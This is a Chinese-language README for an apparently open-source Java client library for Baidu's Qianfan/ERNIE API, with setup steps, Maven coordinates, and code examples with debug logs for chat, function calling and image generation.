    - **网页解析：** 从任何网页链接获取所需文本信息
    - **天气查询：** 输入地址，给出当前该地址天气；输入地址+时间，给出该地址时间段内的天气

## 二、系统要求

1. **JDK17**或更高版本

## 三、跑通测试

1. 到[百度智能云](https://cloud.baidu.com/)上注册一个账号
2. 在百度智能云上[创建一个应用](https://console.bce.baidu.com/qianfan/ais/console/applicationConsole/application)，你将会得到一个API Key和一个Secret Key
3. 声明环境变量：
   ```shell
   export QIANFAN_AK=<YOUR APP-KEY>
   export QIANFAN_SK=<YOUR SECRET-KEY>
   ```
   注意：[PluginAppTestCase](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/pluginapp/PluginAppTestCase.java)
   测试用例如果要跑通，需要在千帆大模型平台创建插件应用，开通`ocr-chat`插件。 并在配置文件中追加一行
   ```shell
   export QIANFAN_PLUGIN_APP_ID=<YOUR PLUGIN-APP ID>
   ```
4. 运行测试用例：`mvn test`

## 四、依赖使用

项目仓库托管在Maven中央仓库，你可以在`pom.xml`中添加以下依赖：
```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>qianfan4j</artifactId>
    <version>1.0.0</version>
</dependency>
```

### 创建客户端

```java
// 线程池
final var executor = Executors.newFixedThreadPool(10);

// 千帆客户端
final var client = QianFanClient.newBuilder()
    .ak(""***"") // API Key
    .sk(""***"") // Secret Key
    .executor(executor)
    .connectTimeout(Duration.ofSeconds(30))
    .build();
```

### 对话示例

```java
// 对话请求
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .messages(Message.ofUser(""hello!""))
    .build();

// 对话响应
final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response);
```

输出结果

```text
2024-03-10 17:53:43 DEBUG qianfan://token/refresh success! expired=1712656423872;
2024-03-10 17:53:43 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""hello!""}]}
2024-03-10 17:53:45 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-7sntu8vk0p"",""object"":""chat.completion"",""created"":1710064425,""result"":""你好！很高兴与你交流。有什么我可以帮助你的吗？请随时告诉我。"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":2,""completion_tokens"":16,""total_tokens"":18}}
你好！很高兴与你交流。有什么我可以帮助你的吗？请随时告诉我。
```

### 函数调用示例

在`qianfan4j`中进行函数的声明将会变成一个非常简单的事情。框架自动帮你完成了函数的声明和参数的解析。这样，你就可以专注于函数的实现，而不用再去关心函数的声明和参数的解析了。

函数声明

```java
@ChatFn(name = ""echo"", description = ""echo words"", examples = {
    @ChatFn.Example(
        question = ""echo: words"",
        thoughts = ""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",
        arguments = """"""
            {
                ""words"": ""hello, world""
            }
            """"""
    )
})
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

    @Override
    public CompletableFuture<Echo> call(Echo echo) {
        return CompletableFuture.completedFuture(new Echo(echo.words()));
    }

    public record Echo(String words) {

    }

}
```

对话触发函数调用

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new EchoFunction())
    .messages(Message.ofUser(""echo: HELLO WORLD!""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

```text
2024-03-10 17:58:37 DEBUG qianfan://token/refresh success! expired=1712656717750;
2024-03-10 17:58:37 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]}]}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-aqte3cvapb"",""object"":""chat.completion"",""created"":1710064720,""result"":"""",""is_truncated"":false,""need_clear_history"":false,""function_call"":{""name"":""echo"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":112,""completion_tokens"":24,""total_tokens"":136}}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function <= {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function => {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}},{""role"":""function"",""content"":""{\""words\"":\""HELLO WORLD!\""}"",""name"":""echo""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]},{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]}]}
2024-03-10 17:58:42 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-tj5rhmj89g"",""object"":""chat.completion"",""created"":1710064722,""result"":""您好，您输入的消息是：HELLO WORLD!，我已原样返回。请问有其他需要吗？"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":225,""completion_tokens"":21,""total_tokens"":246}}
您好，您输入的消息是：HELLO WORLD!，我已原样返回。请问有其他需要吗？
```

### 多函数调用示例

`qianfan4j`会根据LLM的推理能力，自动拆解多函数调用的任务，然后按照拆解的任务顺序依次调用函数。这样，你就可以专注于函数的实现，而不用再去关心函数的调用顺序了。
我们假设有两个函数 [QueryScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/QueryScoreFunction.java)和 [ComputeAvgScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/ComputeAvgScoreFunction.java)，分别用于查询成绩和计算平均分。我们可以通过以下方式实现多函数调用：

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new QueryScoreFunction(), new ComputeAvgScoreFunction())
    .option(ChatOptions.IS_STREAM, true)
    .option(ChatOptions.IS_ENABLE_SEARCH, false)
    .option(ChatOptions.TEMPERATURE, 0.01f)
    .messages(Message.ofUser(""计算李四的语文和数学平均分""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

```text
2024-03-10 18:02:44 DEBUG qianfan://token/refresh success! expired=1712656964044;
2024-03-10 18:02:44 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gmjf3vyemg"",""object"":""chat.completion"",""created"":1710064967,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""query_score"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":676,""completion_tokens"":92,""total_tokens"":768}}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function <= {""name"":""李四"",""subjects"":[""CHINESE"",""MATH""]}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function => {""message"":""查询成功"",""data"":[{""name"":""李四"",""subject"":""CHINESE"",""value"":80.0},{""name"":""李四"",""subject"":""MATH"",""value"":70.0}],""success"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]},{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:48 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064968,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""李四"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064969,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""的语文成绩是80分，数学成绩是70分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064970,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""他的平均分是75分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""如果您需要更详细的信息或有其他问题，请随时告诉我。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":36,""total_tokens"":848}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""李四的语文成绩是80分，数学成绩是70分。他的平均分是75分。如果您需要更详细的信息或有其他问题，请随时告诉我。""},{""role"":""user"",""content"":"" 使用[compute_avg_score]工具计算平均分""}],""functions"":[{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-y42i2td7tk"",""object"":""chat.completion"",""created"":1710064973,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""compute_avg_score"",""thoughts"":""我需要调用[compute_avg_score]工具来计算李四的平均分。"",""arguments"":""{\""scores\"":[80,70]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":680,""completion_tokens"":30,""total_tokens"":710}}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function <= {""scores"":[80,70]}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function => {""avg_score"":75.0}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""李四的语文成绩是80分，数学成绩是70分。他的平均分是75分。如果您需要更详细的信息或有其他问题，请随时告诉我。""},{""role"":""user"",""content"":"" 使用[compute_avg_score]工具计算平均分""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\""scores\"":[80,70]}"",""thoughts"":""我需要调用[compute_avg_score]工具来计算李四的平均分。""}},{""role"":""function"",""content"":""{\""avg_score\"":75.0}"",""name"":""compute_avg_score""}],""functions"":[{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064974,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""根据您的要求"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064975,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""，我已经使用[compute_avg_score]工具计算了李四的平均分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064976,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""他的平均分是75.0分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""如果您还有其他问题或需要更详细的信息，请随时告诉我。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":42,""total_tokens"":731}}
根据您的要求，我已经使用[compute_avg_score]工具计算了李四的平均分。他的平均分是75.0分。如果您还有其他问题或需要更详细的信息，请随时告诉我。
```

在一次对话中，`qianfan4j`根据用户的需求，使用了`query_score`工具来查询李四的语文和数学成绩，分别是80分和70分， 
然后使用`compute_avg_score`工具来计算他们的语文平均分。最终，助手返回了李四的语文和数学平均分为75分。

### 文生图示例

`qianfan4j`会将文心一言返回的BASE64编码封装为`BufferedImage`类型，方便开发者进行后续的图像处理。
下面是一个简单的示例，展示了如何使用`qianfan4j`进行图像处理：

```java
final var request = GenerationImageRequest.newBuilder()
    .model(GenerationImageModel.STABLE_DIFFUSION_XL)
    .prompt(""猫"")
    .negative(""白色"")
    .option(GenerationImageOptions.NUMBERS, 2)
    .option(GenerationImageOptions.SIZE, GenerationImageRequest.Size.S_1024_1024)
    .build();

final var response = client.generationImage(request)
    .async()
    .join();
```

然后你就可以通过`response.images().get(0)`拿到生成的图片的`BufferedImage`类型进行后续操作了。

![文生图-猫](https://ompc-images.oss-cn-hangzhou.aliyuncs.com/erniebot4j/gen-image-as-mr0hyfmsix-001.png)

## 五、参与贡献

如果你对`qianfan4j`感兴趣并希望为其做出贡献，请遵循以下步骤：

1. Fork本项目到你的GitHub账户。
2. 克隆项目到你的本地环境。
3. 创建一个新的分支用于你的修改。
4. 提交你的更改并通过`Pull Request`请求合并到主分支。

在提交Pull Request之前，请确保你的代码符合项目的编码规范和最佳实践，并且已经通过了相关的测试。

## 六、特别致谢

首先，我要向百度千帆大模型团队的同学们表达我最深切地感谢。正是他们不懈的努力和卓越的工作成果，使得我们能够如此便捷地利用千帆的API使用文心一言在内的LLM大模型进行开发。
他们为整个开发者社区树立了榜样，推动了技术的进步。

### 关于文心一言

作为个人使用者，我对文心一言这个产品怀有极高地评价。相较于OpenAi的GPT-4，虽然在某些功能上还有待完善，但文心一言在稳定性方面展现出了显著的优势。
在实际应用中，它的可靠和稳定让我倍感信赖，这也是我选择它作为开发基础的重要原因之一。

同时我也希望在多模态的时代，千帆大模型平台和文心一言不要落后。

### 缘起与动机

当我得知千帆大模型发布了SDK时，我迫不及待地想要集成到我的项目中。然而，我遗憾地发现他们的SDK当时并不支持Java。
作为一个Java开发者，我深知Java在开发者社区中的普及程度和重要性。因此，我决定自己动手，填补这一空白，为Java开发者提供一个方便、易用的文心一言客户端。

正是在这样的背景下，我发起了`qianfan4j`项目。它旨在成为文心一言的Java开发者最佳伴侣，提供简洁明了的API接口，帮助开发者快速集成和使用文心一言的功能。
通过`qianfan4j`，Java开发者可以轻松地实现对话、续写、向量嵌入和图像处理等功能，极大地提升了开发效率和用户体验。

### 展望与呼吁

展望未来，我希望`qianfan4j`能够成为Java开发者与千帆大模型平台之间的桥梁，推动千帆和文心一言在更多领域的应用和发展。
同时，我也呼吁更多的开发者加入到`qianfan4j`的开源社区中来，共同完善和优化这个项目，让它更好地服务于整个开发者社区。

## 七、相关链接

